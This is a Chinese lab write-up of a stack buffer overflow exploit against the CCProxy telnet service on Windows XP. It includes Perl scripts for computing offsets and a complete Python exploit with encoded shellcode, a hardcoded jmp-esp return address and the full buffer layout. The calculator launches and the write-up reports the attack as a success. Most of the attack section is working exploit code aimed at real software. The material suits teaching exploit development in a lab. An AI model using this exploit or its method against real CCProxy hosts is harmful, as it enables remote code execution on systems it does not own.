# CCProxy缓冲区溢出实验

## 实验环境

溢出对象：CCProxy

调试工具：CDB、WinDbg、OllyDBG、IDA Pro

实验环境：VMware、Windows xp sp3（关闭dep）、python

## 测试CCProxy漏洞

1. ipconfig 


主机IP为192.168.1.104

2. telnet 192.168.1.104 23

```
CCProxy Telnet>CCProxy Telnet Service Ready.
```

3. 挂起CCProxy

```
cdb.exe -pn ccproxy
```

输入g调试工具开始运行

4. ping AAAA

![image](https://user-images.githubusercontent.com/104044489/233097959-44dd30ee-771b-467b-bff5-08cac8c5d0f0.png)

5. ping AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA…

![image](https://user-images.githubusercontent.com/104044489/233098106-6dfed4e7-c256-44c0-ae80-6fd49c512822.png)

6. dd esi/esp

![image](https://user-images.githubusercontent.com/104044489/233098196-492e2d0a-47a1-45f7-a8e8-d31ba70fe06f.png)

7. 结论

CCProxy的缓冲区溢出条件在ping 1000~2000个字符之间。

## 攻击思路

1. 获取RET相对偏移量

获取方法：利用一串不重复的字符填充缓冲区，然后查看覆盖RET的字符串，计算它们在整个字符串中的位置，从而得出缓冲区的大小及RET的偏移

编写patternCreate.pl脚本代码生成2000个不重复的字符，patternCreate.pl主要代码如下：

```perl
sub PatternCreate {
    my ($length) = @_;
    my ($X, $Y, $Z);
    my $res;
    while (1)
    {
        for my $X ("A" .. "Z") { for my $Y ("a" .. "z") { for my $Z (0 .. 9) {
           $res .= $X;
           return $res if length($res) >= $length;
           $res .= $Y;
           return $res if length($res) >= $length;
           $res .= $Z;
           return $res if length($res) >= $length;
        }}}
    }
}
```

ping生成的字符串，cdb捕捉到异常

![image](https://user-images.githubusercontent.com/104044489/233098268-ea90ab37-c17c-412d-b176-c12760913e42.png)

从图中可以看到EIP寄存器的值为：0x68423768；通过patternOffset.pl计算出它在整个长为2000的字符串中的偏移。

patternOffset.pl代码如下：

```perl
sub PatternOffset {
     my $pattern = shift;
     my $address = shift;
     my $endian = @_ ? shift() : 'V';
     my @results;
     my ($idx, $lst) = (0,0);
     $address = pack($endian, hex($address));
     $idx = index($pattern, $address, $lst);
     while ($idx > 0)
     {
          push @results, $idx;
          $lst = $idx + 1;
          $idx = index($pattern, $address, $lst);
     }
     return @results;
}
```

在cmd中输入perl.exe patternOffset.pl 68423768 2000运行脚本：

![image](https://user-images.githubusercontent.com/104044489/233098307-1f056338-78bf-48cc-9e5c-56e06e3ab4e8.png)

这说明，RET相对缓冲区起始地址的偏移大小是1012字节。

使用同样的方法获取ESP偏移量为0x61413161

```
perl.exe patternOffset.pl 61413161 2000
```

![image](https://user-images.githubusercontent.com/104044489/233098347-9c9b4b3a-2ecc-41b5-b064-dd7e1e4f4446.png)

这说明ESP指向字符串的第4个字节

## 构造shellcode

攻击代码：

```python
import socket

def send(attackcode, host='192.168.1.104', port=23):
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        data = b'ping ' + attackcode + b'\r\n'
        sock.send(data)
        sock.recv(1000)
        
shellcode = b"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30" + \
b"\x42\x36\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42" + \
b"\x30\x41\x44\x41\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x34" + \
b"\x4e\x33\x4b\x38\x4e\x37\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x31\x4b\x38\x4f\x45\x42\x52\x41\x30\x4b\x4e" + \
b"\x49\x54\x4b\x38\x46\x53\x4b\x48\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c\x46\x47\x47\x30\x41\x4c" + \
b"\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x50\x45\x37\x45\x4e\x4b\x48\x4f\x45\x46\x42" + \
b"\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x44\x4b\x58\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x38\x41\x50" + \
b"\x4b\x4e\x49\x48\x4e\x35\x46\x52\x46\x50\x43\x4c\x41\x33\x42\x4c\x46\x56\x4b\x38\x42\x34\x42\x53\x45\x38\x42\x4c\x4a\x37" + \
b"\x4e\x50\x4b\x38\x42\x54\x4e\x50\x4b\x48\x42\x37\x4e\x31\x4d\x4a\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x48" + \
b"\x42\x4b\x42\x30\x42\x30\x42\x30\x4b\x38\x4a\x36\x4e\x33\x4f\x55\x41\x53\x48\x4f\x42\x46\x48\x45\x49\x48\x4a\x4f\x43\x58" + \
b"\x42\x4c\x4b\x37\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x30\x4f\x35\x4a\x46\x4a\x49\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f" + \
b"\x47\x4e\x43\x56\x41\x46\x4e\x36\x43\x46\x42\x30\x5a"

RET_addr = bytes.fromhex('7ffa4512')[::-1]
attackcode = ((b"\x90" *4 + shellcode).ljust(1012,b"\x90") + RET_addr).ljust(2000,b"\x90")
```

## 攻击测试

1. 打开ccproxy并用cdb挂起，telnet连接到23端口

2. 运行python代码，输入`send(attackcode)`回车

3. 程序执行，计算器程序弹出，cdb中记录程序溢出详细情况

![image](https://user-images.githubusercontent.com/104044489/233098386-ba95751f-a965-403e-8d82-956d7ec2238f.png)

攻击成功
